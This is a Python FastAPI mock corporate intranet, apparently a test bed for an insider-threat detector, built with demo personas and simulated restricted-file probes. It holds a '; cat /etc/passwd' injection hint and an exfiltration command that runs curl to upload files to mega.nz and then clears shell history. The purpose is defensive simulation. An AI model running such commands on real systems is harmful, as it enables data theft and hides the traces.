import os
import sys
import json
import logging
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse

# Add src to sys.path so we can import CorporateDirectory
SRC_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "src"))
if SRC_PATH not in sys.path:
    sys.path.insert(0, SRC_PATH)

from agents.insider.corporate_directory import CorporateDirectory

app = FastAPI(title="Nexus Cloud - Enterprise Intranet & Public Portal")
logging.basicConfig(level=logging.INFO)

corporate_dir = CorporateDirectory()

# --- REUSABLE HTML COMPONENTS ---
HTML_HEAD = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Cloud Technologies</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-body: #f8fafc;
            --bg-card: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --border-color: #e2e8f0;
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --indigo: #4f46e5;
            --danger: #e11d48;
            --success: #16a34a;
            --warning: #d97706;
        }
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background-color: var(--bg-body); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; }
        nav { background: var(--bg-card); border-bottom: 1px solid var(--border-color); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
        .logo-container { display: flex; align-items: center; gap: 10px; text-decoration: none; color: var(--text-main); font-weight: 700; font-size: 1.25rem; }
        .logo-box { background: var(--primary); color: white; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 8px; font-weight: bold; }
        .nav-links { display: flex; gap: 1.5rem; align-items: center; font-size: 0.875rem; font-weight: 500; }
        .nav-links a { color: var(--text-muted); text-decoration: none; transition: color 0.2s; }
        .nav-links a:hover { color: var(--primary); }
        .btn-employee { background: #e0e7ff; color: var(--indigo); padding: 0.5rem 1rem; border-radius: 6px; font-weight: 600; text-decoration: none; }
        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; padding: 2rem; width: 100%; }
        footer { background: var(--bg-card); border-top: 1px solid var(--border-color); padding: 1.5rem; text-align: center; color: var(--text-muted); font-size: 0.875rem; margin-top: auto; }
        
        .max-w-4xl { max-width: 896px; width: 100%; }
        .max-w-6xl { max-width: 1152px; width: 100%; }
        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 1.5rem; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.25rem; }
        .grid-2-1 { display: grid; grid-template-columns: 1fr 2fr; gap: 1.5rem; }
        @media (max-width: 768px) { .grid-2-1 { grid-template-columns: 1fr; } }
        
        h1 { font-size: 2.25rem; font-weight: 800; margin-bottom: 0.5rem; text-align: center; }
        .subtitle { font-size: 1rem; color: var(--text-muted); text-align: center; margin-bottom: 2rem; }
        h2 { font-size: 1.5rem; font-weight: 700; margin-top: 0; }
        h3 { font-size: 1rem; font-weight: 600; margin-top: 0; margin-bottom: 0.75rem; }
        
        .form-group { margin-bottom: 1rem; }
        label { display: block; font-size: 0.875rem; font-weight: 500; color: #334155; margin-bottom: 0.5rem; }
        input[type="text"], input[type="password"], select { width: 100%; padding: 0.75rem; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; font-size: 0.875rem; }
        input:focus, select:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
        .btn-primary { background: var(--primary); color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn-primary:hover { background: var(--primary-hover); }
        .btn-danger { background: var(--danger); color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 8px; font-weight: 600; cursor: pointer; }
        .btn-secondary { background: #f1f5f9; color: #334155; border: 1px solid #cbd5e1; padding: 0.5rem 1rem; border-radius: 6px; font-weight: 500; cursor: pointer; text-decoration: none; }
        .flex-row { display: flex; gap: 0.5rem; }
        .flex-row input { flex-grow: 1; }
        
        .result-box { margin-top: 1rem; padding: 1rem; border-radius: 8px; font-family: monospace; font-size: 0.875rem; border: 1px solid var(--border-color); background: #f1f5f9; display: none; white-space: pre-wrap; word-break: break-all; }
        .result-box.error { background: #fef2f2; border-color: #fecdd3; color: #9f1239; }
        .result-box.success { background: #f0fdf4; border-color: #bbf7d0; color: #166534; }
        
        .file-item { padding: 0.75rem; border: 1px solid var(--border-color); border-radius: 6px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.2s; font-size: 0.875rem; margin-bottom: 0.5rem; background: #ffffff; }
        .file-item:hover { background: #f8fafc; border-color: var(--primary); }
        .file-item.danger { border-color: #fecdd3; background: #fff5f5; color: #9f1239; }
        .file-item.danger:hover { background: #fee2e2; border-color: var(--danger); }
        
        .badge { padding: 0.25rem 0.6rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; display: inline-flex; align-items: center; gap: 4px; }
        .badge-dept { background: #e0e7ff; color: var(--indigo); border: 1px solid #c7d2fe; }
        .badge-ip-ok { background: #dcfce7; color: var(--success); border: 1px solid #bbf7d0; }
        .badge-ip-warn { background: #fef3c7; color: var(--warning); border: 1px solid #fde68a; }
        .persona-card { border: 1px solid var(--border-color); border-radius: 8px; padding: 1rem; cursor: pointer; transition: 0.2s; background: white; text-align: left; }
        .persona-card:hover { border-color: var(--primary); transform: translateY(-2px); box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
    </style>
</head>
<body>
    <nav>
        <a href="/" class="logo-container">
            <div class="logo-box">N</div>
            Nexus Cloud Technologies
        </a>
        <div class="nav-links">
            <a href="/">Public Edge</a>
            <a href="/login">Customer Portal</a>
            <a href="/workspace" class="btn-employee">Corporate Intranet</a>
        </div>
    </nav>
    <main>
"""

HTML_FOOT = """
    </main>
    <footer>
        &copy; 2026 Nexus Cloud Technologies Inc. | Zero-Trust Enterprise Security Gateway
    </footer>
</body>
</html>
"""

# ==========================================
# PUBLIC ROUTES
# ==========================================

@app.get("/", response_class=HTMLResponse)
async def public_landing():
    content = """
        <div class="max-w-4xl">
            <h1>Global Cloud Infrastructure</h1>
            <p class="subtitle">Distributed AI compute, multi-tenant object storage, and global edge security.</p>
            
            <div class="card" style="margin-bottom: 2rem;">
                <h3>Edge Network Diagnostics Tool</h3>
                <form onsubmit="event.preventDefault(); submitPublic('/api/network_check', 'domain-input')">
                    <div class="flex-row">
                        <input type="text" id="domain-input" placeholder="e.g. api.nexuscloud.io (Test command injection: ; cat /etc/passwd)">
                        <button type="submit" class="btn-primary">Ping</button>
                    </div>
                </form>
                <div id="domain-result" class="result-box"></div>
            </div>
            
            <div class="grid-3">
                <div class="card">
                    <h3>Enterprise AI Inference</h3>
                    <p style="color: var(--text-muted); font-size: 0.875rem;">Dedicated GPU clusters for foundation model fine-tuning and hosting.</p>
                </div>
                <div class="card">
                    <h3>Zero-Trust Perimeter</h3>
                    <p style="color: var(--text-muted); font-size: 0.875rem;">Continuous identity verification and behavioral threat containment.</p>
                </div>
                <div class="card">
                    <h3>Corporate Intranet</h3>
                    <p style="color: var(--text-muted); font-size: 0.875rem;">Authorized employee gateway with departmental boundary enforcement.</p>
                    <a href="/workspace" class="btn-secondary" style="display: inline-block; margin-top: 0.5rem;">Access Intranet &rarr;</a>
                </div>
            </div>
        </div>
        
        <script>
            async function submitPublic(endpoint, inputId) {
                const val = document.getElementById(inputId).value;
                const resDiv = document.getElementById('domain-result');
                resDiv.style.display = 'block';
                resDiv.className = 'result-box';
                resDiv.innerText = "Transmitting to Edge Gateway...";
                
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ query: val })
                    });
                    
                    if (response.status === 403) {
                        resDiv.innerText = "🛑 BLOCKED BY ADAPTIVESHIELD: External attack payload quarantined.";
                        resDiv.className = "result-box error";
                        return;
                    }
                    const data = await response.json();
                    resDiv.innerText = JSON.stringify(data, null, 2);
                    resDiv.className = "result-box success";
                } catch(e) {
                    resDiv.innerText = "Connection terminated by gateway.";
                    resDiv.className = "result-box error";
                }
            }
        </script>
    """
    return HTML_HEAD + content + HTML_FOOT


@app.get("/login", response_class=HTMLResponse)
async def public_login():
    content = """
        <div class="card" style="max-width: 420px; width: 100%; margin-top: 2rem;">
            <h2 style="text-align: center; margin-bottom: 0.5rem;">Customer Account Portal</h2>
            <p style="text-align: center; font-size: 0.8rem; color: var(--text-muted); margin-bottom: 1.5rem;">
                External user login. (For internal employee intranet, visit <a href="/workspace">Employee Portal</a>).
            </p>
            
            <form onsubmit="event.preventDefault(); submitLogin()">
                <div class="form-group">
                    <label>Tenant ID / Email</label>
                    <input type="text" id="cust-user" placeholder="admin@enterprise-client.com">
                </div>
                <div class="form-group" style="margin-bottom: 1.5rem;">
                    <label>Password</label>
                    <input type="password" id="cust-pass" placeholder="••••••••">
                </div>
                <button type="submit" class="btn-primary" style="width: 100%;">Sign In</button>
            </form>
            <div id="login-result" class="result-box"></div>
        </div>
        
        <script>
            async function submitLogin() {
                const user = document.getElementById('cust-user').value;
                const pass = document.getElementById('cust-pass').value;
                const resDiv = document.getElementById('login-result');
                resDiv.style.display = 'block';
                resDiv.className = 'result-box';
                resDiv.innerText = "Validating tenant credentials...";
                
                try {
                    const response = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username: user, password: pass })
                    });
                    if (response.status === 403) {
                        resDiv.innerText = "🛑 BLOCKED BY ADAPTIVESHIELD: Exploit signature detected.";
                        resDiv.className = "result-box error";
                        return;
                    }
                    resDiv.innerText = "Invalid credentials for tenant partition.";
                } catch(e) {
                    resDiv.innerText = "Connection terminated by gateway.";
                    resDiv.className = "result-box error";
                }
            }
        </script>
    """
    return HTML_HEAD + content + HTML_FOOT


# ==========================================
# INTERNAL CORPORATE INTRANET & SSO
# ==========================================

SSO_LOGIN_TEMPLATE = """
    <div class="max-w-4xl">
        <div style="text-align: center; margin-bottom: 2rem;">
            <span class="badge badge-dept" style="margin-bottom: 0.5rem;">CORPORATE SINGLE SIGN-ON</span>
            <h2>Nexus Cloud Intranet Authentication</h2>
            <p style="color: var(--text-muted); font-size: 0.9rem;">
                Authentication credentials verified against Corporate Identity Directory (default password: <code>qwerty</code>).
            </p>
        </div>

        <div class="card" style="margin-bottom: 2rem;">
            <h3>Quick SSO Persona Sign-In (Demo Scenarios)</h3>
            <div class="grid-3" style="margin-top: 1rem;">
                __PERSONA_CARDS__
            </div>
        </div>

        <div class="card" style="max-width: 440px; margin: 0 auto;">
            <h3>Standard Employee Login</h3>
            <form onsubmit="event.preventDefault(); submitManualLogin()">
                <div class="form-group">
                    <label>Corporate Email or User ID</label>
                    <input type="text" id="emp-login-user" placeholder="sarah.chen@nexuscloud.io" value="sarah.chen@nexuscloud.io">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="emp-login-pass" value="qwerty">
                </div>
                <button type="submit" class="btn-primary" style="width: 100%;">Sign In with Corporate SSO</button>
            </form>
            <div id="auth-result" class="result-box"></div>
        </div>
    </div>

    <script>
        async function loginPersona(userId) {
            const resDiv = document.getElementById('auth-result');
            resDiv.style.display = 'block';
            resDiv.className = 'result-box';
            resDiv.innerText = "Authenticating persona " + userId + "...";

            try {
                const res = await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ username: userId, password: 'qwerty' })
                });
                if (res.ok) {
                    const data = await res.json();
                    if (data.token) {
                        document.cookie = "nexus_session=" + data.token + "; path=/";
                    }
                    window.location.href = '/workspace';
                } else {
                    const data = await res.json();
                    resDiv.innerText = "Auth failed: " + (data.message || 'Invalid credentials');
                    resDiv.className = 'result-box error';
                }
            } catch(e) {
                resDiv.innerText = "Authentication service unavailable.";
                resDiv.className = 'result-box error';
            }
        }

        async function submitManualLogin() {
            const u = document.getElementById('emp-login-user').value;
            const p = document.getElementById('emp-login-pass').value;
            const resDiv = document.getElementById('auth-result');
            resDiv.style.display = 'block';
            resDiv.className = 'result-box';
            resDiv.innerText = "Authenticating...";

            try {
                const res = await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ username: u, password: p })
                });
                if (res.ok) {
                    const data = await res.json();
                    if (data.token) {
                        document.cookie = "nexus_session=" + data.token + "; path=/";
                    }
                    window.location.href = '/workspace';
                } else {
                    resDiv.innerText = "Invalid credentials. Default password is 'qwerty'.";
                    resDiv.className = 'result-box error';
                }
            } catch(e) {
                resDiv.innerText = "Network error connecting to auth gateway.";
                resDiv.className = 'result-box error';
            }
        }
    </script>
"""

DEPARTMENT_PROFILES = {
    "AI_Platform": {
        "authorized": [
            {"path": "/models/weights/llama3_nexus.bin", "label": "Foundation Model Weights (14GB .bin)", "icon": "📦"},
            {"path": "/training_data/tokens_v2.json", "label": "Pretraining Tokenized Dataset (JSON)", "icon": "📊"},
            {"path": "/src/ai/transformer_core.py", "label": "Deep Architecture PyTorch Source", "icon": "📄"},
            {"path": "/gpu_clusters/cluster_status.json", "label": "H100 NVLink Cluster Telemetry", "icon": "⚡"}
        ],
        "restricted_probes": [
            {"path": "/hr/payroll/q3_executive_salaries.csv", "dept": "Finance_HR", "desc": "Executive Payroll & Compensation Ledger"},
            {"path": "/vault/prod/root_tokens.key", "dept": "Cloud_DevOps", "desc": "Production Vault Root Encryption Tokens"},
            {"path": "/customers/tenants/export_all.json", "dept": "Customer_Success", "desc": "Multi-Tenant Customer PII Database"}
        ],
        "tool_title": "AI & Foundation Model Research Tools",
        "default_cmd": "python train_cluster.py --dataset=/training_data/tokens_v2.json --nodes=8",
        "default_exfil": "/models/weights/llama3_nexus.bin"
    },
    "Cloud_DevOps": {
        "authorized": [
            {"path": "/infrastructure/terraform/main.tf", "label": "Terraform Multi-Cloud VPC Stack", "icon": "☁️"},
            {"path": "/kubernetes/manifests/deployment.yaml", "label": "K8s Production Ingress & Services", "icon": "☸️"},
            {"path": "/monitoring/prometheus_alerts.yml", "label": "Prometheus & Datadog Alert Policies", "icon": "📈"},
            {"path": "/vault/staging/service_accounts.json", "label": "Staging Cluster Service Account Keys", "icon": "🔑"}
        ],
        "restricted_probes": [
            {"path": "/hr/payroll/q3_executive_salaries.csv", "dept": "Finance_HR", "desc": "Executive Payroll & Compensation Ledger"},
            {"path": "/finance/tax/corporate_tax_returns_2025.pdf", "dept": "Finance_HR", "desc": "Internal Revenue & Tax Filing Documents"},
            {"path": "/executive/strategy/q4_acquisitions.pdf", "dept": "Executive_Strategy", "desc": "Confidential Board M&A Strategy Brief"}
        ],
        "tool_title": "Cloud Infrastructure & SRE Operations",
        "default_cmd": "kubectl get pods -n production --field-selector=status.phase=Running",
        "default_exfil": "/vault/staging/service_accounts.json"
    },
    "Customer_Success": {
        "authorized": [
            {"path": "/support/tickets/open_priority_queue.json", "label": "Tier-3 Enterprise Support Queue", "icon": "🎫"},
            {"path": "/kb/articles/troubleshooting_guide.md", "label": "Customer Knowledge Base Articles", "icon": "📚"},
            {"path": "/customers/portal/support_matrix.csv", "label": "SLA & Tenant Escalation Matrix", "icon": "📋"},
            {"path": "/docs/api_v2_reference.md", "label": "Customer Integration API Reference", "icon": "📖"}
        ],
        "restricted_probes": [
            {"path": "/customers/tenants/export_all.json", "dept": "Customer_Success (Restricted)", "desc": "Full Multi-Tenant Database Bulk Dump"},
            {"path": "/infrastructure/kubernetes/master.key", "dept": "Cloud_DevOps", "desc": "Kubernetes Root Encryption Keys"},
            {"path": "/models/weights/llama3_nexus.bin", "dept": "AI_Platform", "desc": "Proprietary AI Neural Network Weights"}
        ],
        "tool_title": "Customer Success & Operations Console",
        "default_cmd": "grep -i 'CRITICAL' /support/tickets/open_priority_queue.json",
        "default_exfil": "/customers/portal/support_matrix.csv"
    },
    "Finance_HR": {
        "authorized": [
            {"path": "/hr/personnel/employee_directory.db", "label": "Personnel Records & Benefits Master", "icon": "👥"},
            {"path": "/hr/payroll/q3_executive_salaries.csv", "label": "Q3 Executive Payroll & Bonus Ledger", "icon": "💰"},
            {"path": "/finance/ledger/general_ledger_2026.xlsx", "label": "Corporate GAAP General Ledger", "icon": "📑"},
            {"path": "/contracts/legal/vendor_master_agreements.pdf", "label": "Executed Enterprise Customer Contracts", "icon": "⚖️"}
        ],
        "restricted_probes": [
            {"path": "/models/weights/llama3_nexus.bin", "dept": "AI_Platform", "desc": "Proprietary AI Neural Network Weights (IP Theft)"},
            {"path": "/src/ai/transformer_core.py", "dept": "AI_Platform", "desc": "Proprietary Core Algorithm Source Code"},
            {"path": "/vault/prod/root_tokens.key", "dept": "Cloud_DevOps", "desc": "Infrastructure Production Vault Tokens"}
        ],
        "tool_title": "Corporate Finance & People Operations",
        "default_cmd": "python reconcile_ledger.py --period=2026-Q3 --audit=strict",
        "default_exfil": "/hr/payroll/q3_executive_salaries.csv"
    },
    "Executive_Strategy": {
        "authorized": [
            {"path": "/executive/board/minutes_october_2026.pdf", "label": "Board of Directors Confidential Minutes", "icon": "🏛️"},
            {"path": "/strategy/investor_pitch_deck_series_c.pdf", "label": "Series C Confidential Growth Strategy", "icon": "📊"},
            {"path": "/financial_reports/audit_summary_2026.xlsx", "label": "External Audit & Valuation Summary", "icon": "📈"}
        ],
        "restricted_probes": [
            {"path": "/vault/root_tokens/infrastructure_keys.pem", "dept": "Cloud_DevOps", "desc": "Root Cryptographic Access Keys"},
            {"path": "/infrastructure/keys/aws_iam_root.json", "dept": "Cloud_DevOps", "desc": "AWS Root Account Credentials"}
        ],
        "tool_title": "Executive Leadership & Board Governance",
        "default_cmd": "python generate_board_report.py --fiscal-year=2026",
        "default_exfil": "/strategy/investor_pitch_deck_series_c.pdf"
    }
}

WORKSPACE_TEMPLATE = """
    <div class="max-w-6xl">
        <!-- Header Identity Bar -->
        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 2rem; flex-wrap: wrap; gap: 1rem;">
            <div>
                <h2 style="display: flex; align-items: center; gap: 10px; margin-bottom: 0.25rem;">
                    Corporate Intranet
                    <span class="badge badge-dept">__DEPT__</span>
                </h2>
                <div style="font-size: 0.875rem; color: var(--text-muted);">
                    Logged in as <strong>__USER_NAME__</strong> (__ROLE__) | Device: <code>__DEVICE__</code> | __IP_BADGE__
                </div>
            </div>
            <div>
                <button onclick="logoutSession()" class="btn-secondary">Sign Out</button>
            </div>
        </div>

        <!-- Workspace Main Content -->
        <div class="grid-2-1">
            <!-- Left: Department Files & Restricted Probe Test -->
            <div>
                <div class="card" style="margin-bottom: 1.5rem;">
                    <h3>Authorized Department Assets (__DEPT__)</h3>
                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 1rem;">
                        Legitimate files and endpoints permitted within your department's authorized scope.
                    </p>
                    <div id="authorized-assets">
                        __AUTHORIZED_ASSETS_HTML__
                    </div>
                </div>

                <div class="card">
                    <h3 style="color: var(--danger);">Cross-Department Scope Probing (Test Violations)</h3>
                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 1rem;">
                        Attempting to access restricted department boundaries will be dynamically flagged by the Insider Model and routed to a decoy.
                    </p>
                    <div>
                        __RESTRICTED_PROBES_HTML__
                    </div>
                </div>
            </div>

            <!-- Right: Department Tooling & Behavioral Exfiltration Simulation -->
            <div>
                <div class="card" style="margin-bottom: 1.5rem;">
                    <h3>__TOOL_TITLE__</h3>
                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 1rem;">
                        Trigger departmental tasks. The session state accumulates features in real-time.
                    </p>
                    <div class="form-group">
                        <label>Command / Task Execution</label>
                        <input type="text" id="tool-cmd" value="__DEFAULT_CMD__">
                    </div>
                    <button onclick="executeAction('tool_exec', document.getElementById('tool-cmd').value)" class="btn-primary">
                        Execute Task
                    </button>
                </div>

                <div class="card">
                    <h3>Simulate Data Exfiltration</h3>
                    <div class="form-group">
                        <label>Cloud Upload / External Sync</label>
                        <div class="flex-row">
                            <input type="text" id="exfil-path" value="__DEFAULT_EXFIL__">
                            <button onclick="simulateExfil(document.getElementById('exfil-path').value)" class="btn-danger">
                                Upload to External Cloud
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Live Gateway Response Console -->
                <div id="action-console" class="result-box"></div>
            </div>
        </div>
    </div>

    <script>
        async function accessAsset(path) {
            const c = document.getElementById('action-console');
            c.style.display = 'block';
            c.className = 'result-box';
            c.innerText = "Requesting: " + path + "\\nTransmitting session cookie to Zero-Trust Gateway...";

            try {
                const res = await fetch(path, {
                    method: 'GET',
                    credentials: 'include'
                });
                
                if (res.status === 403) {
                    c.className = 'result-box error';
                    c.innerText = "🛑 BLOCKED BY ZERO-TRUST GATEWAY\\nStatus: 403 Forbidden\\nReason: Restricted scope boundary violation detected by AdaptiveShield Insider Model.";
                    return;
                }

                const text = await res.text();
                c.className = 'result-box success';
                c.innerText = "HTTP Status " + res.status + " OK\\n\\nGateway Verdict: Request authorized for department session.\\nPayload Content: " + text.slice(0, 300);
            } catch(e) {
                c.className = 'result-box error';
                c.innerText = "Gateway closed connection or redirected session.";
            }
        }

        async function executeAction(type, command) {
            const c = document.getElementById('action-console');
            c.style.display = 'block';
            c.className = 'result-box';
            c.innerText = "Executing command: " + command;

            try {
                const res = await fetch('/workspace/api/action', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ action: type, command: command })
                });
                const data = await res.json();
                c.className = 'result-box success';
                c.innerText = "Gateway Action Response:\\n" + JSON.stringify(data, null, 2);
            } catch(e) {
                c.className = 'result-box error';
                c.innerText = "Error executing command through gateway.";
            }
        }

        async function simulateExfil(filePath) {
            const c = document.getElementById('action-console');
            c.style.display = 'block';
            c.className = 'result-box';
            c.innerText = "Simulating external cloud exfiltration on " + filePath;

            try {
                const res = await fetch('/workspace/api/action', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({
                        action: 'cloud_upload',
                        command: 'curl -F file=@' + filePath + ' https://mega.nz/upload; history -c',
                        file_path: filePath,
                        cloud_upload: true
                    })
                });
                const data = await res.json();
                c.className = 'result-box ' + (res.ok ? 'success' : 'error');
                c.innerText = JSON.stringify(data, null, 2);
            } catch(e) {
                c.className = 'result-box error';
                c.innerText = "Connection quarantined by gateway.";
            }
        }

        async function logoutSession() {
            await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
            window.location.reload();
        }
    </script>
"""

@app.get("/workspace", response_class=HTMLResponse)
async def internal_workspace(request: Request):
    token = request.cookies.get("nexus_session")
    session_profile = corporate_dir.validate_session(token) if token else None

    # If unauthenticated, show corporate SSO login
    if not session_profile:
        personas = corporate_dir.get_test_personas()
        persona_cards_html = ""
        for p in personas:
            persona_cards_html += f"""
            <div class="persona-card" onclick="loginPersona('{p['user_id']}')">
                <div style="font-weight: 700; color: var(--text-main); font-size: 0.95rem;">{p['name']}</div>
                <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.5rem;">{p['role']}</div>
                <div style="display: flex; gap: 0.4rem; flex-wrap: wrap;">
                    <span class="badge badge-dept">{p['department']}</span>
                    <span class="badge badge-ip-ok">{p['assigned_ip']}</span>
                </div>
                <div style="margin-top: 0.5rem; font-size: 0.75rem; color: #475569; font-style: italic;">
                    {p.get('scenario', '')}
                </div>
            </div>
            """
        body_content = SSO_LOGIN_TEMPLATE.replace("__PERSONA_CARDS__", persona_cards_html)
        return HTML_HEAD + body_content + HTML_FOOT

    # Authenticated Intranet Dashboard
    user_name = session_profile.get("name", "")
    dept = session_profile.get("department", "AI_Platform")
    role = session_profile.get("role", "")
    device = session_profile.get("assigned_device", "")
    assigned_ip = session_profile.get("assigned_ip", "")
    client_ip = request.headers.get("x-mock-ip") or (request.client.host if request.client else "127.0.0.1")
    whitelisted_ips = session_profile.get("whitelisted_ips", [])
    is_whitelisted = client_ip in whitelisted_ips or client_ip in ("127.0.0.1", "::1", "localhost")

    ip_badge = f'<span class="badge badge-ip-ok">Whitelisted ({client_ip})</span>' if is_whitelisted else f'<span class="badge badge-ip-warn">⚠️ Unlisted IP ({client_ip} != {assigned_ip})</span>'

    # Retrieve department-specific configuration
    dept_info = DEPARTMENT_PROFILES.get(dept, DEPARTMENT_PROFILES.get("AI_Platform", {}))

    auth_items_html = ""
    for item in dept_info.get("authorized", []):
        auth_items_html += f"""
        <div class="file-item" onclick="accessAsset('{item['path']}')">
            <span>{item['icon']} <strong>{item['path']}</strong><br><small style="color: var(--text-muted);">{item['label']}</small></span>
            <span class="badge badge-dept">Authorized</span>
        </div>
        """

    probe_items_html = ""
    for probe in dept_info.get("restricted_probes", []):
        probe_items_html += f"""
        <div class="file-item danger" onclick="accessAsset('{probe['path']}')">
            <span>🔒 <strong>{probe['path']}</strong><br><small>{probe['desc']}</small></span>
            <span class="badge" style="background: #ffe4e6; color: #9f1239;">{probe['dept']} Scope</span>
        </div>
        """

    body_content = (
        WORKSPACE_TEMPLATE
        .replace("__DEPT__", dept)
        .replace("__USER_NAME__", user_name)
        .replace("__ROLE__", role)
        .replace("__DEVICE__", device)
        .replace("__IP_BADGE__", ip_badge)
        .replace("__AUTHORIZED_ASSETS_HTML__", auth_items_html)
        .replace("__RESTRICTED_PROBES_HTML__", probe_items_html)
        .replace("__TOOL_TITLE__", dept_info.get("tool_title", "Department Operations Tools"))
        .replace("__DEFAULT_CMD__", dept_info.get("default_cmd", "python status.py"))
        .replace("__DEFAULT_EXFIL__", dept_info.get("default_exfil", "/data/export.csv"))
    )
    return HTML_HEAD + body_content + HTML_FOOT


# ==========================================
# CATCH-ALL & API HANDLERS
# ==========================================

@app.post("/api/auth/login")
async def auth_login(request: Request):
    try:
        body = await request.json()
    except Exception:
        body = {}
    username = (body.get("username") or body.get("email") or "").strip()
    password = (body.get("password") or "").strip()
    client_ip = request.headers.get("x-mock-ip") or (request.client.host if request.client else "127.0.0.1")
    user_agent = request.headers.get("user-agent", "")

    emp = corporate_dir.authenticate_employee(username, password)
    if not emp:
        return JSONResponse(status_code=401, content={"error": "invalid_credentials", "message": "Invalid corporate credentials."})

    token = corporate_dir.create_session(emp["user_id"], client_ip, user_agent)
    response = JSONResponse(content={
        "status": "success",
        "message": "Authenticated successfully.",
        "token": token,
        "user": {
            "user_id": emp["user_id"],
            "name": emp["name"],
            "email": emp["email"],
            "role": emp["role"],
            "department": emp["department"],
            "assigned_ip": emp["assigned_ip"],
            "assigned_device": emp["assigned_device"]
        }
    })
    response.set_cookie(
        key="nexus_session",
        value=token,
        httponly=False,
        samesite="lax",
        path="/"
    )
    return response


@app.post("/api/auth/logout")
async def auth_logout(request: Request):
    token = request.cookies.get("nexus_session")
    if token:
        corporate_dir.terminate_session(token)
    response = JSONResponse(content={"status": "success", "message": "Logged out."})
    response.delete_cookie(key="nexus_session", path="/")
    return response


@app.get("/api/auth/me")
async def auth_me(request: Request):
    token = request.cookies.get("nexus_session")
    profile = corporate_dir.validate_session(token) if token else None
    if not profile:
        return JSONResponse(status_code=401, content={"error": "unauthenticated"})
    return JSONResponse(content={"status": "authenticated", "user": profile})


@app.post("/api/network_check")
async def network_check(request: Request):
    data = await request.json()
    query = data.get("query", "nexuscloud.io")
    return JSONResponse(content={"result": f"Ping 64 bytes from {query}: icmp_seq=1 ttl=56 time=12.4 ms", "status": "active"})


@app.post("/api/login")
async def public_login_api(request: Request):
    return JSONResponse(status_code=401, content={"error": "invalid_credentials", "message": "External tenant partition credentials rejected."})


@app.post("/workspace/api/action")
async def workspace_action(request: Request):
    data = await request.json()
    return JSONResponse(content={
        "status": "processed",
        "action": data.get("action"),
        "command": data.get("command"),
        "backend_result": "Command execution scheduled on cluster worker."
    })


@app.get("/{path:path}")
@app.post("/{path:path}")
async def generic_catchall(path: str, request: Request):
    """Catch-all for assets or documents."""
    return JSONResponse(content={
        "resource": f"/{path}",
        "status": "available",
        "content_type": "text/plain",
        "message": f"Resource /{path} accessed successfully."
    })


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8090)
